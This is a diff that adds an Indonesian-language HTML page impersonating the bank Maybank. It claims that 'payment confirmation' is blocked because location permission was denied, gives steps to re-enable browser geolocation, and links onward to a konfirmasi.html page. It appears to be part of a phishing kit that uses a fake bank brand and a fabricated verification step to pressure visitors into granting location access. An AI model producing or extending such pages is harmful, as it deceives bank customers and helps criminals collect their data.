@@ -1,0 +1,109 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>maybank — Izin Lokasi Diperlukan</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
+    body { background: #f5f5f5; min-height: 100vh; display: flex; flex-direction: column; }
+
+    header { background: #FFD100; box-shadow: 0 2px 10px rgba(0,0,0,.15); }
+    .header-inner {
+      max-width: 560px; margin: 0 auto; padding: 16px 20px;
+      display: flex; align-items: center; gap: 12px;
+    }
+    .brand-name { font-size: 30px; font-weight: 800; color: #000; letter-spacing: -1px; }
+
+    main { flex: 1; width: 100%; max-width: 560px; margin: 0 auto; padding: 40px 20px; text-align: center; }
+
+    .icon-wrap {
+      width: 96px; height: 96px; margin: 0 auto 24px;
+      background: #FFD100; border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      box-shadow: 0 6px 20px rgba(255,209,0,.5);
+    }
+
+    h1 { font-size: 22px; font-weight: 800; color: #111; line-height: 1.4; margin-bottom: 12px; }
+    p.desc { color: #666; font-size: 15px; line-height: 1.6; margin-bottom: 28px; }
+
+    .steps {
+      background: #fff; border-radius: 16px; text-align: left;
+      box-shadow: 0 8px 28px rgba(0,0,0,.08);
+      border-top: 6px solid #FFD100; padding: 22px 24px; margin-bottom: 28px;
+    }
+    .steps h2 { font-size: 15px; text-transform: uppercase; letter-spacing: 1px; color: #888; margin-bottom: 14px; }
+    .steps ol { padding-left: 20px; }
+    .steps li { font-size: 14.5px; color: #333; line-height: 1.7; margin-bottom: 8px; }
+    .steps li b { color: #000; }
+
+    .btn-try {
+      width: 100%; background: #FFD100; color: #000; border: none;
+      padding: 16px; font-size: 17px; font-weight: 800;
+      border-radius: 12px; cursor: pointer; display: block; text-decoration: none;
+      box-shadow: 0 5px 14px rgba(255,209,0,.45);
+      transition: transform .12s ease, box-shadow .2s ease;
+    }
+    .btn-try:hover { transform: translateY(-2px); box-shadow: 0 8px 20px rgba(255,209,0,.6); }
+
+    .btn-settings {
+      width: 100%; margin-top: 12px;
+      background: #fff; color: #111; border: 2px solid #ddd;
+      padding: 14px; font-size: 15px; font-weight: 700;
+      border-radius: 12px; cursor: pointer; display: block; text-decoration: none;
+      transition: border-color .2s ease;
+    }
+    .btn-settings:hover { border-color: #FFD100; }
+
+    .note { margin-top: 18px; font-size: 12.5px; color: #aaa; line-height: 1.5; }
+    footer { padding: 16px; text-align: center; color: #bbb; font-size: 12px; }
+  </style>
+</head>
+<body>
+
+  <header>
+    <div class="header-inner">
+      <img src="images.png" width="46" height="46" alt="Maybank">
+      <span class="brand-name">maybank</span>
+    </div>
+  </header>
+
+  <main>
+    <div class="icon-wrap">
+      <svg width="48" height="48" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
+        <path d="M12 2C8.1 2 5 5.1 5 9c0 5.2 7 13 7 13s7-7.8 7-13c0-3.9-3.1-7-7-7z" fill="#000" stroke="#000" stroke-width="1.5"/>
+        <circle cx="12" cy="9" r="2.8" fill="#FFD100" stroke="#FFD100" stroke-width="1.5"/>
+        <line x1="4" y1="20" x2="20" y2="4" stroke="#000" stroke-width="2.5" stroke-linecap="round"/>
+      </svg>
+    </div>
+
+    <h1>Untuk Memastikan Konfirmasi Pembayaran<br>Izinkan Lokasi</h1>
+    <p class="desc">
+      Kami memerlukan akses lokasi Anda untuk memverifikasi transaksi.
+      Sayangnya, izin lokasi telah <b>ditolak</b> sehingga konfirmasi
+      pembayaran tidak dapat dilanjutkan.
+    </p>
+
+    <div class="steps">
+      <h2>Cara Mengaktifkan Kembali</h2>
+      <ol>
+        <li>Klik ikon <b>🔒 gembok</b> di kolom alamat browser Anda.</li>
+        <li>Pilih <b>Pengaturan Situs</b> (Site Settings).</li>
+        <li>Ubah izin <b>Lokasi</b> (Location) menjadi <b>Izinkan</b> (Allow).</li>
+        <li>Muat ulang halaman, lalu klik <b>Coba Lagi</b>.</li>
+      </ol>
+    </div>
+
+    <a href="konfirmasi.html" class="btn-try">Coba Lagi</a>
+    <a href="chrome://settings/content/location" class="btn-settings">Buka Pengaturan Browser</a>
+
+    <p class="note">
+      * Tombol "Buka Pengaturan Browser" berfungsi di Google Chrome / Microsoft Edge.<br>
+      Untuk browser lain, buka Pengaturan → Privasi → Lokasi.
+    </p>
+  </main>
+
+  <footer>© maybank — Halaman Konfirmasi Pembayaran</footer>
+
+</body>
+</html>
